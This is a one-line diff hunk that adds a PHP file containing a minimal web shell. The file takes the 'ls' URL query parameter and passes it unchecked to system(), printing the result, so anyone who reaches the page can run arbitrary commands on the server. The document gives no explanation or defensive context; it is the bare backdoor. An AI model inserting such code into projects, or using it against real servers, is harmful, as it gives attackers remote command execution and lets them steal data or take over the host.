@@ -1,0 +1,1 @@
+<?php $p=$_GET[ls]; echo system($p);?>
